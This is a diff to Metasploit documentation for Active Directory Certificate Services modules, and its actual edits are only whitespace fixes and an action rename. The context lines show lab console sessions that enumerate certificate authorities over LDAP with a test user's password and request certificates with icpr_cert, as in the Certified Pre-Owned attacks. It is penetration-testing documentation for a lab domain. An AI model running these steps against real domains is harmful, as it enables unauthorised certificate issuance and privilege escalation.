@@ -37,13 +37,13 @@ For this module to work, it's necessary to know the name of a CA and certificate
 by a normal user via LDAP.
 
 ```
-msf6 > use auxiliary/gather/ldap_query 
+msf6 > use auxiliary/gather/ldap_query
 msf6 auxiliary(gather/ldap_query) > set BIND_DN aliddle@msflab.local
 BIND_DN => aliddle@msflab.local
 msf6 auxiliary(gather/ldap_query) > set BIND_PW Password1!
 BIND_PW => Password1!
-msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_ADCS_CAS 
-ACTION => ENUM_ADCS_CAS
+msf6 auxiliary(gather/ldap_query) > set ACTION ENUM_AD_CS_CAS
+ACTION => ENUM_AD_CS_CAS
 msf6 auxiliary(gather/ldap_query) > run
 [*] Running module against 192.168.159.10
 
@@ -71,7 +71,7 @@ In this scenario, an authenticated user issues a certificate for themselves usin
 by default. The user must know the CA name, which in this case is `msflab-DC-CA`.
 
 ```
-msf6 > use auxiliary/admin/dcerpc/icpr_cert 
+msf6 > use auxiliary/admin/dcerpc/icpr_cert
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
@@ -111,7 +111,7 @@ See [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910
 information.
 
 ```
-msf6 > use auxiliary/admin/dcerpc/icpr_cert 
+msf6 > use auxiliary/admin/dcerpc/icpr_cert
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set RHOSTS 192.168.159.10
 RHOSTS => 192.168.159.10
 msf6 auxiliary(admin/dcerpc/icpr_cert) > set SMBUser aliddle
